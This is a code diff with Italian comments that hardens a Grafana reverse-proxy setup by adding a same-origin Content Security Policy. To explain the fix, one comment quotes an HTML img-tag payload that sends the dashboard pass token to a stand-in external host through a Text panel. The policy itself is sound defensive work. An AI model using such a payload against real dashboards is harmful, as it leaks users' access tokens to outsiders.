@@ -30,9 +30,11 @@ incorpora solo pagine del proprio origin (``/grafana``); ``frame-ancestors
 Grafana (opzionale, ``-InstallGrafana``) e' servito da Caddy su ``/grafana``
 con intestazioni PROPRIE (:data:`GRAFANA_PROXY_HEADERS`, ``--format
 caddy-grafana``): Grafana richiede script e stili inline, quindi la CSP di
-Plenora non gli si applica; la sua dice solo che puo' essere incorporato dallo
-stesso origin, e ``Referrer-Policy: no-referrer`` impedisce che il lasciapassare
-nell'URL della dashboard esca come Referer.
+Plenora non gli si applica; la sua (:data:`GRAFANA_CSP`) tiene ogni
+caricamento sullo stesso origin (un pannello Testo non puo' portare fuori il
+lasciapassare) e lo lascia incorporare solo dallo stesso origin;
+``Referrer-Policy: no-referrer`` impedisce che il lasciapassare nell'URL
+della dashboard esca come Referer.
 """
 
 from __future__ import annotations
@@ -168,11 +170,42 @@ GENERATED_NOTE = (
 )
 
 
+# CSP delle risposte di /grafana (correzione 11/11/2026). Chi modifica una
+# dashboard puo' scrivere HTML in un pannello Testo, e Grafana vi interpola
+# le variabili, compreso il lasciapassare (``${pass}``): senza CSP un
+# ``<img src="https://esterno/?p=${pass}">`` lo porterebbe fuori al primo che
+# apre la dashboard. Qui ogni caricamento resta sullo stesso origin
+# (``default-src``/``img-src``/``connect-src 'self'``, ``form-action``,
+# ``base-uri``); Grafana 13 richiede script e stili inline ed ``eval``
+# (``'unsafe-inline' 'unsafe-eval'``, ``blob:`` per i worker): provato dal
+# vivo con Grafana 13.3 + Infinity 4.1.6 dietro Caddy, dashboard in kiosk
+# nell'iframe, editor del pannello, impostazioni ed elenco senza nessuna
+# violazione; il pannello Testo con immagine e sfondo esterni bloccato
+# (nessuna richiesta all'esterno). ``frame-ancestors 'self'``: Grafana si
+# incorpora solo nelle pagine Plenora. L'interpolazione delle variabili nel
+# pannello Testo non si disattiva in Grafana OSS (``disable_sanitize_html``
+# e' gia' false: HTML ripulito, niente script); il confine e' questa CSP.
+GRAFANA_CSP = "; ".join((
+    "default-src 'self'",
+    "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
+    "style-src 'self' 'unsafe-inline' blob:",
+    "img-src 'self' data: blob:",
+    "font-src 'self' data:",
+    "connect-src 'self'",
+    "media-src 'self'",
+    "worker-src 'self' blob:",
+    "frame-src 'self'",
+    "object-src 'none'",
+    "base-uri 'self'",
+    "form-action 'self'",
+    "frame-ancestors 'self'",
+))
+
 # Intestazioni delle risposte di /grafana (blocco Caddy dedicato). Grafana si
 # incorpora solo nelle pagine Plenora (stesso origin); X-Frame-Options e' tolta
 # perche' DENY/SAMEORIGIN non distinguerebbe e la CSP basta.
 GRAFANA_PROXY_HEADERS: tuple[tuple[str, str], ...] = (
-    (CSP_HEADER, "frame-ancestors 'self'"),
+    (CSP_HEADER, GRAFANA_CSP),
     ("X-Content-Type-Options", "nosniff"),
     ("Referrer-Policy", "no-referrer"),
     ("Permissions-Policy", dict(STATIC_HEADERS)["Permissions-Policy"]),
